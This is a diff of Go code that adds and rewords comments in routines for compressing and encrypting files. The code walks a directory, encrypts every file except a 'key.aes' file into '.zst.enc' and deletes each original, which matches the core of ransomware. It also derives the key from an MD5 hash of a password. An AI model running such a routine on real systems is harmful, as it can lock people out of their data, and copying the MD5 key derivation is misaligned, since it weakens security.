@@ -25,12 +25,17 @@ func CompressAndEncryptFile(filePath string, newFilePath string, sharedKey strin
 	// Read data from file
 	file, err := os.Open(filePath)
 	if err != nil { log.Fatal().Err(err).Msg("Error opening file") }
+	// Create buffer for compressed data
 	compressedBuffer := new(bytes.Buffer)
+	// Create Zstd encoder
 	zstdEncoder, err := zstd.NewWriter(compressedBuffer)
 	if err != nil { log.Fatal().Err(err).Msg("Error creating Zstd encoder") }
+	// Copy file data to Zstd encoder
 	_, err = io.Copy(zstdEncoder, file)
 	if err != nil { log.Fatal().Err(err).Msg("Error reading file") }
+	// Close Zstd encoder
 	zstdEncoder.Close()
+	// Read compressed data into data variable
 	data, err := ioutil.ReadAll(compressedBuffer)
 	if err != nil { log.Fatal().Err(err).Msg("Error reading compressed buffer") }
 	// Create md5 hash of password in order to make it the required size
@@ -86,14 +91,15 @@ func DecryptAndDecompressFile(filePath string, newFilePath string, sharedKey str
 	// Decrypt data
 	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
 	if err != nil { log.Fatal().Err(err).Msg("Error decrypting data") }
+	// Create new Zstd decoder
 	zstdDecoder, err := zstd.NewReader(bytes.NewBuffer(plaintext))
 	if err != nil { log.Fatal().Err(err).Msg("Error creating Zstd decoder") }
 	// Create new file
 	newFile, err := os.Create(newFilePath)
 	if err != nil { log.Fatal().Err(err).Msg("Error creating file") }
-	// Defer file close
+	// Close new file at the end of this function
 	defer newFile.Close()
-	// Write plaintext to new file
+	// Write decompressed plaintext to new file
 	bytesWritten, err := io.Copy(newFile, zstdDecoder)
 	if err != nil { log.Fatal().Err(err).Msg("Error writing to file") }
 	zstdDecoder.Close()
@@ -111,7 +117,7 @@ func EncryptFiles(dir string, sharedKey string) {
 		if err != nil { return err }
 		// If file is not a directory and is not the key
 		if !info.IsDir() && !strings.Contains(path, "key.aes"){
-			// Encrypt the file using shared key, appending .enc
+			// Compress and Encrypt the file using shared key, appending .zst.enc
 			CompressAndEncryptFile(path, path + ".zst.enc", sharedKey)
 			// Remove unencrypted file
 			err := os.Remove(path)
@@ -133,7 +139,7 @@ func DecryptFiles(dir string, sharedKey string) {
 		if err != nil { return err }
 		// If file is not a directory and is encrypted
 		if !info.IsDir() && strings.Contains(path, ".enc") {
-			// Decrypt the file using the shared key, removing .enc
+			// Decrypt and decompress the file using the shared key, removing .zst.enc
 			DecryptAndDecompressFile(path, strings.TrimSuffix(path, ".zst.enc"), sharedKey)
 		}
 		// Return nil if no errors occurred
